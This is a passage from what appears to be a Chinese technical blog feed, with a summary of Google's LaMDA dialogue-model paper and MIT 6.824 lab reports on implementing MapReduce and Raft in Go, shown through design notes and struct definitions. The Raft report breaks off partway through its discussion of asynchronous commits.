<p>本篇博客中，梳理了 Thrift 和 Kitex 的相关概念，通过一个简单的案例上手实践，分析项目结构并成功验证结果。作为框架的使用者，我们已经可以了解到基本用法，进一步深入原理是可选步骤。后面我会进一步分析请求的处理过程，来弄清楚易用性的背后，框架的底层运行机制是怎样的。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.cloudwego.io/zh/docs/kitex/">Kitex |
CloudWeGo</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/45194118">Apache
Thrift 系列详解 (一) - 概述与入门 - 知乎 (zhihu.com)</a></li>
<li><a href="https://en.wikipedia.org/wiki/Apache_Thrift">Apache Thrift
- Wikipedia</a></li>
<li><a href="https://thrift.apache.org/docs/idl.html">Apache Thrift -
Interface Description Language (IDL)</a></li>
<li><a href="https://www.cnblogs.com/chenny7/p/4224720.html">Thrift
的原理和使用 - 如果的事 - 博客园 (cnblogs.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>后端</category>
        <category>微服务</category>
        <category>RPC</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>微服务</tag>
        <tag>字节跳动</tag>
        <tag>RPC</tag>
        <tag>Kitex</tag>
      </tags>
  </entry>
  <entry>
    <title>谷歌 LaMDA：高达 137B 参数的 “全能型” 聊天机器人</title>
    <url>/blog/2022/03/19/LaMDA/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>《LaMDA: Language Models for Dialog
Applications》是谷歌于 2022 年发表的论文，收录在 arxiv 中。论文提出了一个名为 LaMDA（<strong>La</strong>nguage
<strong>M</strong>odels for <strong>D</strong>ialog
<strong>A</strong>pplication）的对话模型，拥有 137B 参数，在 1.56T 公开对话数据和网页上预训练。实验证明，虽然模型扩展能够提升对话质量，但是在安全性和事实性方面的改进很小。而监督数据上的微调能够帮助模型利用外部知识源进行回复，显著改进了安全性和事实性两个指标。</p>
<span id="more"></span>
<p>LaMDA 构建了一个工具集（TS，Tool
set），包含：信息检索系统、计算器、翻译器。通过监督数据微调，LaMDA 能够利用这些工具来回答问题，这使得模型能够根据已知知识来源做出响应，减少了幻觉现象。</p>
<h2 id="简介">简介</h2>
<p>LaMDA
使用单个 Transformer 模型来执行多项任务：它生成潜在响应，然后出于安全考虑对其进行过滤、基于外部知识源并重新排序以找到最高质量的响应。LaMDA 的参数范围从
2B 到 137B
参数，在以上指标上进行测试。结果如下图所示。左侧为质量分数，右侧为安全性和事实性分数。</p>
<p><img src="overview.png"></p>
<p>可以观察到：</p>
<ul>
<li>单独的模型缩放提高了质量，但它在安全性和接地性方面的改进远远落后于人类表现</li>
<li>结合缩放和微调在所有指标上显着提高了
LaMDA，尽管模型的性能仍然低于人类水平在安全性和接地性的水平</li>
</ul>
<h2 id="预训练">预训练</h2>
<p>预训练模型架构都差不多，关键参数如下：</p>
<ul>
<li>参数规模：137B</li>
<li> 数据集：预训练（2.97B 文档 + 1.12B 对话）</li>
<li>架构 &amp; 训练目标：Transformer-Decoder，语言模型（预测下一个 token），如下图所示</li>
<li>训练成本：1024 TPU-v3 * 57.7 天</li>
</ul>
<p><img src="pretraining.png"></p>
<h2 id="评价指标">评价指标</h2>
<h3 id="ssi">SSI</h3>
<p><strong>SSI</strong> 是合理性、特异性、趣味性三项指标（Sensibleness,
Specificity,
Interestingnes）的平均值，是谷歌在 Menna 中提出的 SSA（合理性、特异性两项平均）的改进。各项指标具体含义如下：</p>
<ul>
<li><strong>合理性</strong>：衡量模型的回复在上下文和不要与前面所说的任何内容相矛盾。然而，通用和无聊的回复，例如 “我不知道” 的合理性分数可能很高。因此只有这一项指标是远远不够的。</li>
<li><strong>特异性</strong>：衡量模型的回复是否特定于上下文。例如，如果用户说 “我爱欧洲电视网”，而模型回答 “我也是”，那么它的特异性得分为
0。因为这种句式适用于很多上下文。</li>
<li><strong>趣味性</strong>：衡量模型的回复是否有趣。例如，对 “我如何扔球？” 的回应可能是 “你可以先捡起然后扔球来扔球”，这是有道理的，并且是针对问题的。另一个更深层次和更令人满意的答案可能是 “扔球的一种方法是用双手牢牢握住它，然后再向下摆动你的手臂，伸展你的肘部，然后向上释放球”。</li>
</ul>
<p>每项指标对应一个 0/1 标签，正例为 1，负例为 0，算术平均后就是 SSI 的值。</p>
<h3 id="角色特定指标">角色特定指标</h3>
<p><strong>有用性</strong>：如果模型的响应包含基于用户使用信息检索系统进行的独立研究的正确信息，并且用户认为它们有帮助，则它们被标记为有用。<strong>有用的响应是信息性响应的子集</strong>，由用户判断为正确且有用。</p>
<p><strong>角色一致性</strong>：如果模型的响应看起来像执行目标角色的代理会说的话，则它们被标记为角色一致。这个与合理性中的一致性不同，这里的一致性是指，例如让模型扮演珠穆朗玛峰，模型的回复中的语气词、设定等都要以珠穆朗玛峰为准。</p>
<h3 id="其他">其他</h3>
<p><strong>安全性</strong>是根据 Google
人工智能原则设定的，用以以避免造成伤害风险的意外结果，并避免产生或加强不公平的偏见，这个对应很多条规则，比较复杂，就略过了。</p>
<p><strong>事实性</strong>：包含外部世界声明的回复中，可由权威外部来源支持的回复的百分比。</p>
<p><strong>信息性</strong>：在所有回复中，包含已知来源支持的外部世界信息的回复所占的百分比。信息性与事实性仅在限定词上有所不同。因此，像 “这是一个好主意” 这样的回答，如果不包含任何外部世界的信息，就不会影响其事实，但会影响其信息性。</p>
<p><strong>引用准确度</strong>：引用其来源 URL 的模型回应在所有明确声称外部世界的回应中所占的百分比，不包括众所周知的事实（如 “马有四条腿”）。</p>
<h2 id="微调">微调</h2>
<h3 id="判别式生成式微调">判别式 / 生成式微调</h3>
<p>为了提高质量，谷歌团队收集了众包人员与 LaMDA 就任何主题交谈的 6400 次对话，每个对话包含 14-30 轮。对于每个模型回复，众包人员为其评估每个质量标签。如果回复不合理（合理性 = 0），不会收集特异性和趣味性标签。同样，如果回复不具体（特异性 = 0），不会收集趣味性标签。</p>
<p>LaMDA 生成回复的时候按照 <code>&lt;上下文&gt;&lt;哨兵&gt;&lt;回复&gt;</code> 的模板进行生成，按照 <code>&lt;上下文&gt;&lt;哨兵&gt;&lt;回复&gt;&lt;属性&gt;&lt;分数&gt;</code> 的模板进行判别式微调，例如 "What’s
up? RESPONSE not much. SENSIBLE 1"。</p>
<p>得到众包数据后，按照上述模板进行微调。这样在生成时，就能够预测出对应属性值作为筛选的辅助信息。将生成的候选序列按照<span class="math inline"> \(3 *P(sensible) + P(specific) +
P(interesting)\)</span> 进行排名，选择排名靠前的候选序列作为下一个响应。</p>
<p>可以看到，经过微调 + 生成筛选，LaMDA 的安全性和质量都有了较高提升。论文贴心地给出了两种类型的图。可以看到经过微调的 LaMDA 比仅预训练的基础模型在各项指标上都有提升，在对话质量上已经接近甚至超过了人类的水平，安全性上也十分接近人类的水平。不过事实性和信息性还有一定的差距。</p>
<p><img src="finetune-line.png"></p>
<p><img src="finetune.png"></p>
<h3 id="调用外部信息系统">调用外部信息系统</h3>
<p>为了避免幻觉，谷歌团队构建了一个工具集（Toolset，TS），包含：信息检索系统、计算器、翻译器。TS 接收一个字符串作为输入，输出一个字符串的列表。例如，计算器接收 135+7721”，返回 [“7856”]。类似地，翻译器可以接收 “hello
in French” 并输出 [“Bonjour”]。信息检索系统可以接收 “Howold is Rafael
Nadal?”，并输出 [“Rafael Nadal / Age /
35”]。如果一个工具无法解析输入（例如，计算器无法解析 “Rafael Nadal
几岁？”），它将返回一个空的结果列表，因此不会对最终输出列表做出贡献。</p>
<p>团队收集了 40k 监督的对话数据用于生成，9k 条 LaMDA 的生成候选数据（标记为正确 / 不正确）用于判别排名。这些数据同样是众包人员与 LaMDA 间通过交互式和静态方法收集得到。</p>
<p>微调分为两部分：</p>
<ul>
<li>根据上下文和基础模型响应，获取 TS 查询字符串。例如，Rafael Nadal
几岁？：上下文 + 基础→“TS，Rafael Nadal 的年龄”</li>
<li> 根据基础回复和 TS 返回结果，预测事实版本回复：例如，“他现在 31
岁”+“Rafael Nadal / Age / 35”。然后它预测事实版本：上下文 + 基础 + 查询
+ 片段 →“用户，他现在 35 岁”。</li>
</ul>
<p>实际交互的例子如下：</p>
<p><img src="toolset.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文还是挺有意思的，这种生成式 + 判别式微调的方式还是第一次见，而且也可以辅助结果搜索。而且，少量的微调数据就可以取得非常好的效果。引用原文中的一句话：使用适量的人工注释微调数据（不到
0.001%
的预训练数据），可以在更好质量和更安全的对话模型方面取得重大进展。</p>
<p>虽然，说是少量，也有几千上万条数据，而且就论文中的标注复杂度，标注成本也是蛮高的。不过相较于预训练数据的海量数据，微调数据可以说是少的多的多了。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话生成</category>
      </categories>
      <tags>
        <tag>自然语言处理</tag>
        <tag>对话生成</tag>
        <tag>LaMDA</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.824 Lab1 实验报告: MapReduce</title>
    <url>/blog/2023/07/05/MIT-6-824-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 MIT 6.824 Lab1 的实验报告。MIT 6.824 是一门分布式系统的课程
，最近打算系统地学习一下，我把课程资源放在了博客末尾，感兴趣的同学也可以一起来学。Lab
1 中，要求用 Golang 实现一个 MapReduce 的框架。</p>
<span id="more"></span>
<p>遵循课程规定，本文没有放出核心代码，只介绍了一些结构设计和流程思考，可放心食用。</p>
<h2 id="实验准备">实验准备</h2>
<h3 id="拉取代码">拉取代码</h3>
<p>在实验指导书中 <a href="https://pdos.csail.mit.edu/6.824/labs/lab-mr.html">6.5840 Lab 1:
MapReduce (mit.edu)</a>，包含了代码库的地址和一些简单介绍。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git://g.csail.mit.edu/6.5840-golabs-2023 6.5840</span><br><span class="line">$ <span class="built_in">cd</span> 6.5840</span><br><span class="line">$ ls</span><br><span class="line">Makefile src</span><br><span class="line">$</span><br></pre></td></tr></tbody></table></figure>
<h3 id="代码骨架介绍">代码骨架介绍</h3>
<p>以 <code>src</code> 为当前目录，Lab 1 里需要关注的是以下几个部分：</p>
<ul>
<li><code>mr/</code>：MapReduce 的核心逻辑，包含协调器（Coordinator）、Worker、RPC 三部分，需要自己实现。</li>
<li><code>mrapps/</code>：MapReduce 的应用，用于测试，例如 <code>wc.go</code> 就是单词计数（WordCount）</li>
<li><code>main/mrsequential.go</code>：MapReduce 的串行启动版本，可以参考一些文件读写的代码</li>
<li><code>main/mrcoordinator.go,
main/mrworker.go</code>：coordinator、worker 的启动类</li>
</ul>
<h3 id="理论知识">理论知识</h3>
<p>MapReduce 框架中，包含两种角色和两个阶段（两种任务）。</p>
<p>两个阶段：</p>
<ul>
<li>Map 阶段：对分块文件运行 Map 函数
<ul>
<li>函数签名：<code>func Map(filename string, contents string)
[]mr.KeyValue</code></li>
<li>接收文件名、文件内容为参数，返回 [key,value] 的列表</li>
</ul></li>
<li> Reduce 阶段：对同一个 KEY 的 VALUE 聚合结果进行规约计算
<ul>
<li>函数签名：<code>func Reduce(key string, values []string)
string</code></li>
<li>key 为 Map 阶段产生的某个 key，values 为 Map 阶段该 key 对应的所有 value 的列表</li>
</ul></li>
<li><strong> Reduce 阶段必须在所有 Map 任务都完成之后才能开始</strong>，否则会丢失数据</li>
</ul>
<p>两种角色是 Coordinator 和 Worker：</p>
<ul>
<li>Coordinator：负责协调任务的执行，将 Map/Reduce 任务下发给 Worker，监听 Worker 状态，如果 Worker 宕机对相关任务进行重新下发</li>
<li> Worker：负责任务的执行，以心跳与 Coordinator 周期交互</li>
</ul>
<p>整体的流程如下：</p>
<ol type="1">
<li>Coordinator 得到输入文件的切片</li>
<li> Coordinator 向 Worker 发送 Map 任务</li>
<li> Worker 上报 Map 任务执行完成，中间结果存储在 Intermediate Files 中</li>
<li><strong>所有 Map 任务执行完毕后</strong>，Coordinator 对同一个 key 的中间结果进行聚合，下发 Reduce 任务</li>
<li> Worker 上报 Reduce 任务执行完成，结果写到输出文件中</li>
<li>所有 Reduce 任务执行完毕，退出</li>
</ol>
<p><img src="mapreduce_architecture.png"></p>
<p>需要注意的是，Worker 可能由于种种原因宕机，所以需要做容错处理。Coordinator 与 Worker 保持心跳，在发现心跳超时一定阈值后，需要把 Worker 标记为已下线，重新下发任务。</p>
<p>另外，考虑 Worker 宕机的时机，如果 Worker 在写入 Reduce 的输出结果时宕机，写了一半的文件可能会产生误解，指导书里的建议是先把结果写到临时文件中，等到运行结束再重命名。</p>
<h2 id="rpc">RPC</h2>
<p>首先需要思考的是，Coordinator 和 Worker 间的通信有几种。目前的架构下，只能由 Worker 主动向 Coordinator 发起请求，获得回应，消息种类可能是：</p>
<ul>
<li>请求一个任务</li>
<li>上报心跳</li>
<li>上报任务结果</li>
</ul>
<p>需要在 RPC 文件里定义好这些请求的 request 和 reply，例如，任务请求的例子如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> AcquireTaskRequest <span class="keyword">struct</span> {</span><br><span class="line">	WorkerCode <span class="keyword">string</span> <span class="comment">// worker id</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AcquireTaskReply <span class="keyword">struct</span> {</span><br><span class="line">	Mode    <span class="keyword">int8</span>     <span class="comment">// 任务模式</span></span><br><span class="line">	Files   []<span class="keyword">string</span> <span class="comment">// 输入</span></span><br><span class="line">	NReduce <span class="keyword">int</span>      <span class="comment">//  reduce桶数量</span></span><br><span class="line">	TaskId  <span class="keyword">string</span>   <span class="comment">// 任务Id</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>设计上，worker 侧最好带有一个唯一的 code，方便追踪和排错，任务也是。此外，任务还需要指定一个执行模式，map/reduce/ 其他。由于 go 没有枚举类型，这里用一个 int8 表示。稍加设计，可以发现任务类型可分为四种：</p>
<ul>
<li>map</li>
<li>reduce</li>
<li>wait：要求 worker 等待一段时间，后续可能会有任务</li>
<li> done；要求 worker 退出，后续不可能有任务了</li>
</ul>
<p>类似地，可以定义心跳、任务结果上报的请求和响应，这里就省去了。考虑到上报结果和请求任务总是成对出现的，设计上也可以进行合并。</p>
<h2 id="coordinator">Coordinator</h2>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Task <span class="keyword">struct</span> {</span><br><span class="line">	Id           <span class="keyword">string</span>    <span class="comment">// 任务Id</span></span><br><span class="line">	Mode         <span class="keyword">int8</span>      <span class="comment">// 运行模式</span></span><br><span class="line">	Files        []<span class="keyword">string</span>  <span class="comment">// 输入文件</span></span><br><span class="line">	WorkerCode   <span class="keyword">string</span>    <span class="comment">// 运行Worker的标识</span></span><br><span class="line">	LastBeatTime time.Time <span class="comment">// 最后一次心跳时间</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Coordinator <span class="keyword">struct</span> {</span><br><span class="line">	sync.Mutex                          <span class="comment">// 互斥锁</span></span><br><span class="line">	Files              []<span class="keyword">string</span>         <span class="comment">// 分片文件</span></span><br><span class="line">	NReduce            <span class="keyword">int</span>              <span class="comment">// reduce 桶数</span></span><br><span class="line">	RunningTaskMap     <span class="keyword">map</span>[<span class="keyword">string</span>]*Task <span class="comment">// 运行中的任务</span></span><br><span class="line">	PendingTasks       []*Task          <span class="comment">// 待运行的任务</span></span><br><span class="line">	MapDone            <span class="keyword">bool</span>             <span class="comment">// Map阶段是否结束</span></span><br><span class="line">	ReduceDone         <span class="keyword">bool</span>             <span class="comment">// Reduce阶段是否结束</span></span><br><span class="line">	ReduceFiles        <span class="keyword">map</span>[<span class="keyword">int</span>][]<span class="keyword">string</span> <span class="comment">// Reduce桶的中间文件</span></span><br><span class="line">	LastWorkerBeatTime time.Time        <span class="comment">// 最后一次Worker心跳时间</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>Coordinator 包含两种 goroutine，rpc 处理的 goroutine、主 goroutine，需要加锁避免竞态条件、保证可见性。</p>
<p>Coordinator 的流程如下：</p>
<ul>
<li>初始化 Map 任务</li>
<li>当 Worker 请求任务时：
<ul>
<li>如果有待执行的 map / 任务，下发</li>
<li>如果没有待执行的 map 任务，且还处在 map 阶段，要求 worker 等待</li>
<li>如果在 reduce 阶段，下发待执行的 reduce 任务，<strong>不存在在要求 worker 等待</strong></li>
</ul></li>
<li>当 Worker 上报任务结果时
<ul>
<li>如果 map 任务全部执行完毕，切换到 reduce 阶段，初始化 reduce 任务</li>
<li>如果 reduce 任务全部执行完毕，退出</li>
</ul></li>
</ul>
<p>此外，需要有一个后台 goroutine 扫描失联的任务，重新下发，这也是为什么没有任务时要求 worker 等待。</p>
<p>需要注意的是，在 Golang 中，由于没有 <code>volatile</code> 这样的字段可以保证可见性，因此要对于共享变量的读写都要加锁来保证可见性。由于 Coordinator 侧没有很重的业务计算逻辑，加锁时间不会太长，可以接受。</p>
<h2 id="worker">Worker</h2>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> worker <span class="keyword">struct</span> {</span><br><span class="line">	sync.Mutex</span><br><span class="line">	WorkerCode  <span class="keyword">string</span>                          <span class="comment">// worker id</span></span><br><span class="line">	TaskId      <span class="keyword">string</span>                          <span class="comment">// task id</span></span><br><span class="line">	Mode        <span class="keyword">int8</span>                            <span class="comment">// 任务模式</span></span><br><span class="line">	InputFiles  []<span class="keyword">string</span>                        <span class="comment">// 任务输入文件</span></span><br><span class="line">	ReduceFiles [][]<span class="keyword">string</span>                      <span class="comment">// reduce输出</span></span><br><span class="line">	Done        <span class="keyword">bool</span>                            <span class="comment">// 任务执行结束</span></span><br><span class="line">	MapF        <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">string</span>, <span class="keyword">string</span>)</span> []<span class="title">KeyValue</span> // <span class="title">map</span>函数</span></span><br><span class="line">	ReduceF     <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">string</span>, []<span class="keyword">string</span>)</span> <span class="title">string</span>   // <span class="title">reduce</span>函数</span></span><br><span class="line">	NReduce     <span class="keyword">int</span>                             <span class="comment">// reduce 桶数量</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>Worker 侧存在两个 goroutine，任务执行和心跳维护。</p>
<p>在 Worker 侧的主逻辑里，需要重复执行：</p>
<ul>
<li>请求任务</li>
<li>根据任务类型、执行任务并上报结果</li>
</ul>
<p>在心跳维护组件里，每隔一段时间上报任务的心跳（任务 Id）。</p>
<p>可以发现，<code>TaskId</code> 作为共享变量、也需要加锁才能保证可见性。但是需要额外考虑的是，Worker 侧可能有耗时的计算逻辑，如果对函数整个加锁，心跳线程长时间获取不到锁就会阻塞，就出问题了。</p>
<p>因此，<strong>需要尽量缩小锁的范围</strong>。<strong>锁的目的是保护共享变量的读写</strong>，分析可知，这种情况下，共享变量只有 <code>TaskId</code>，因此，可以抽一个函数，只对获取 <code>TaskId</code> 这一步加锁，就可以避免锁范围太大导致的问题。</p>
<h2 id="课程资源">课程资源</h2>
<ul>
<li>课程首页：<a href="https://pdos.csail.mit.edu/6.824/schedule.html">6.5840 Schedule:
Spring 2023 (mit.edu)</a></li>
<li>b 站课程视频：<a href="https://www.bilibili.com/video/BV1R7411t71W/?p=1&amp;vd_source=05e9e6106f7d1eabead6a8b9f4ab5820">Lecture
1- Introduction_哔哩哔哩_bilibili</a></li>
<li>Lab 1 指导书：<a href="https://pdos.csail.mit.edu/6.824/labs/lab-mr.html">6.5840 Lab 1:
MapReduce (mit.edu)</a></li>
</ul>
]]></content>
      <categories>
        <category>MIT 6.824</category>
      </categories>
      <tags>
        <tag>MIT 6.824</tag>
        <tag>分布式系统</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.824 Lab2 实验报告: Raft</title>
    <url>/blog/2023/07/17/MIT-6-824-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 MIT 6.824
Lab2 的实验报告，用 Golang 实现 Raft 强一致性协议，包含 leader 选举、日志同步、持久化、日志快重传、日志压缩几部分内容。</p>
<span id="more"></span>
<p>遵循课程规定，本文没有放出核心代码，只介绍了一些结构设计和流程思考，可放心食用。</p>
<h2 id="理论知识">理论知识</h2>
<h3 id="raft简介">Raft 简介</h3>
<p>Raft 是一种基于<mark style="background: #FFB86CA6;">过半票决</mark>（Majority
Vote）的分布式共识算法。过半票决是指，对于某个决定（例如选举谁做 Leader），只有当超过半数以上的节点都投票同意，才会生效。这里的半数是指所有节点中的半数（包括已经宕机、下线的节点）。一般设置服务器数量为奇数，因为偶数多的一台服务器是没有意义的。通常来说，<code>2n+1</code> 个节点可以最多容忍 <code>n</code> 个节点下线。</p>
<p>Raft 中，存在三种角色：Leader（至多一个）、Candidate、Follower。Leader 会接收应用请求，产生日志，将日志同步给 Follwer，当 Leader 发现超过半数的节点都正确接收了日志，就可以想应用层提交日志。</p>
<p>Raft 中，Leader 是以任期（term）为单位存在的。每个任期中至多只会有一个 leader，Leader 会通过心跳与 Follower 保持沟通。初始时，所有节点均为 Follower，每个 Follower 有一个选举计时器，当收到 leader 信息后会将其重置。若 follower 的选举计时器超时，则会将任期 + 1，开始一次 leader 选举，将自身的日志更新情况和任期等信息发送给其他节点，由它们投出赞成 / 反对票。若某个 follower 获取了超半数的赞成票，则它会成为 leader。</p>
<h3 id="过半票决">过半票决</h3>
<p>过半票决可以避免脑裂。即使网络存在分区，也<strong>必然不可能有超过一个分区拥有过半数量的服务器</strong>，进而可以保证 leader 只有一个。这里背后更微妙的点在于，如果你<strong>总是需要过半的服务器才能完成任何操作</strong>，同时你有一系列的操作需要完成，其中的每一个操作都需要过半的服务器来批准，例如选举
Raft 的
Leader，那么<strong>每一个操作对应的过半服务器，必然至少包含一个服务器存在于上一个操作的过半服务器中</strong>。也就是说，任意两组过半服务器，至少有一个服务器是重叠的。实际上，相比其他特性，Raft
更依赖这个特性来避免脑裂。</p>
<blockquote>
<p>这里可以用反证法思考。如果两组过半服务器，不重叠，交集为空，所以它们的并集节点数 &gt; N，即不重复的节点数量大于
N，就有矛盾了</p>
</blockquote>
<p>例如，当一个 Raft Leader 竞选成功，那么这个 Leader
必然凑够了过半服务器的选票，而这组过半服务器中，必然与旧 Leader
的过半服务器有重叠。所以，<mark style="background: #FFB86CA6;">新的
Leader 必然知道旧 Leader 使用的任期号</mark>（term
number），因为<strong>新 Leader 的过半服务器必然与旧 Leader
的过半服务器有重叠</strong>，而旧 Leader
的过半服务器中的每一个必然都知道旧 Leader
的任期号。类似的，<strong>任何旧 Leader 提交的操作，必然存在于过半的
Raft 服务器中</strong>，而任何新 Leader
的过半服务器中，必然有至少一个服务器包含了旧 Leader 的所有操作。这是
Raft 能正确运行的一个重要因素。</p>
<h3 id="日志">日志</h3>
<p>在 Raft 中，每个应用请求都会关联创建一条日志（Log）。为什么要有日志？有以下几个原因：</p>
<ul>
<li><strong>日志是 Leader
用来对操作排序的一种手段</strong>，这使得应用层的操作可以以某种正确的逻辑串行执行</li>
<li><strong>日志用来存放临时操作</strong>。Follower
收到了这些临时的操作，但是还不确定这些操作是否被 commit
了，只有当超过半数以上节点都收到，才会 commit，否则会丢弃</li>
<li><strong>日志可以用来持久化</strong>。Leader
需要在它的日志中记录操作，因为这些操作可能需要重传给
Follower，用于恢复状态</li>
</ul>
<h3 id="日志压缩">日志压缩</h3>
<p>在 Raft 中，Log
压缩和快照解决的问题是：对于一个长期运行的系统，例如运行了几周，几个月甚至几年，
Log 会持续增长。最后可能会有数百万条
Log，从而需要大量的内存来存储。如果持久化存储在磁盘上，最终会消耗磁盘的大量空间。如果一个服务器重启了，它需要通过重新从头开始执行这数百万条
Log 来重建自己的状态。当故障重启之后，遍历并执行整个 Log
的内容可能要花费几个小时来完成。这在某种程度上来说是浪费，因为在重启之前，服务器已经有了一定的应用程序状态。</p>
<p>所以，当 Raft 认为它的 Log 将会过于庞大，例如大于 1MB，10MB
或者任意的限制，Raft 会要求应用程序在 Log
的特定位置，对其状态做一个快照。所以，如果 Raft
要求应用程序做一个快照，Raft 会从 Log
中选取一个与快照对应的点，然后要求应用程序在那个点的位置做一个快照，并丢弃这个点之前的日志。</p>
<h2 id="整体设计">整体设计</h2>
<p>本人的代码经过了一百多次测试，没有任何问题，下面我先介绍一下我的整体设计，供读者参考。</p>
<p>首先介绍一下 <code>Raft</code> 结构体。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Raft <span class="keyword">struct</span> {</span><br><span class="line">	sync.Mutex                     <span class="comment">// Lock to protect shared access to this peer's state</span></span><br><span class="line">	peers      []*labrpc.ClientEnd <span class="comment">// RPC end points of all peers</span></span><br><span class="line">	persister  *Persister          <span class="comment">// Object to hold this peer's persisted state</span></span><br><span class="line">	me         <span class="keyword">int</span>                 <span class="comment">// this peer's index into peers[]</span></span><br><span class="line">	dead       <span class="keyword">int32</span>               <span class="comment">// set by Kill()</span></span><br><span class="line">	<span class="comment">// common properties</span></span><br><span class="line">	applyCh <span class="keyword">chan</span> ApplyMsg</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// leader election</span></span><br><span class="line">	role               <span class="keyword">int8</span></span><br><span class="line">	lastLeaderBeatTime time.Time</span><br><span class="line">	electionTimeout    time.Duration</span><br><span class="line">	electionCond       *sync.Cond</span><br><span class="line">	<span class="comment">// Persistent state</span></span><br><span class="line">	currentTerm       <span class="keyword">int</span>        <span class="comment">// 当前 Term ID（初值为 0）</span></span><br><span class="line">	votedFor          <span class="keyword">int</span>        <span class="comment">// 该 Term 中已接收到来自该节点的选票的 Candidate ID</span></span><br><span class="line">	logs              []LogEntry <span class="comment">// 日志记录。第一个日志记录的 index 值为 1</span></span><br><span class="line">	lastIncludedIndex <span class="keyword">int</span>        <span class="comment">// 日志的快照偏移，初始为0，也相当于已经在快照中的最大日志索引，可以用来判断日志进度</span></span><br><span class="line">	lastIncludedTerm  <span class="keyword">int</span>        <span class="comment">// lastIncludedIndex 对应的term</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// all-server volatile states</span></span><br><span class="line">	commitIndex <span class="keyword">int</span> <span class="comment">// 最后一个已提交日志记录的 index（初值为 0）</span></span><br><span class="line">	lastApplied <span class="keyword">int</span> <span class="comment">// 最后一个已应用至上层状态机的日志记录的 index（初值为 0）</span></span><br><span class="line">	commitCond  *sync.Cond</span><br><span class="line">	<span class="comment">// leader volatile states</span></span><br><span class="line">	nextIndex  []<span class="keyword">int</span> <span class="comment">// 每个节点即将为其发送的下一个日志记录的 index（初值均为 Leader 最新日志记录 index 值 + 1）</span></span><br><span class="line">	matchIndex []<span class="keyword">int</span> <span class="comment">// 每个节点上已备份的最后一条日志记录的 index（初值均为 0）</span></span><br><span class="line">	<span class="comment">// service persistence</span></span><br><span class="line">	snapshot []<span class="keyword">byte</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>里面的内容是随着每次 lab 填充的，逐步增加功能即可。宏观上看，结构体内需要存储以下信息：</p>
<ul>
<li>leader 选举的信息：节点的角色、选举计时器、超时时间等</li>
<li>需要持久化的重要信息：任期、投票对象、日志、快照等</li>
<li>提交信息：记录提交日志索引、上传应用层日志索引</li>
<li> leader 记录 follower 的信息：记录每个节点的下一个发送的日志索引、匹配的日志索引</li>
</ul>
<h3 id="goroutine">goroutine</h3>
<p>除了处理 RPC 的线程外，一个服务器节点要常驻几个后台线程呢？在我的设计里，是三个：</p>
<ul>
<li>ticker：维护选举定时器，超时后发起选举</li>
<li> leaderHeartBeat：若当前节点是 leader，定期心跳、同步日志</li>
<li> asyncCommit：当 <code>commitIndex&gt;lastApplied</code> 时，向应用层逐个提交日志</li>
</ul>
<p>下面，我将逐个介绍。</p>
<h3 id="ticker">ticker</h3>
<p>ticker 单独启动一个线程应该是毋庸置疑的，问题在于如何设计选举定时器呢。在我的设计里，选举定时器由两部分组成：</p>
<ul>
<li>起始时间：从什么时候开始计时，对应 <code>lastLeaderBeatTime</code></li>
<li>超时时间：超过多久判定超时，对应 <code>electionTimeout</code></li>
</ul>
<p>ticker 会检查当前时间是否超过 <code>lastLeaderBeatTime+electionTimeout</code>，若是，则起一个<strong>异步线程</strong>开始选举。</p>
<h3 id="leaderheartbeat">leaderHeartBeat</h3>
<p>leader 用来维护心跳和同步日志的线程。如果要做的精细一点，可以通过 <code>sync.Cond</code> 等到当前节点成为 leader 后再唤醒，或者粗暴一点直接 <code>sleep</code> 重试就好了。</p>
<h3 id="asynccommit">asyncCommit</h3>
<p>这个是有必要讲一下的。为什么要异步提交？因为我在做 2D
快照实验的时候发现了一个死锁的问题。当时我使用的是同步提交，逻辑示例如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">AppendEntries</span><span class="params">(args *AppendEntriesRequest, reply *AppendEntriesReply)</span></span> {</span><br><span class="line">    rf.Lock()</span><br><span class="line">    <span class="keyword">defer</span> rf.Unlock()</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// for log in toCommit</span></span><br><span class="line">    <span class="comment">// do</span></span><br><span class="line">    <span class="comment">// 	   rf.applyCh &lt;- log</span></span><br><span class="line">    <span class="comment">// done</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>为了保证日志的串行提交，整个提交过程中是加锁同步的。在 2D 实验里，创建快照的过程示例如下：</p>
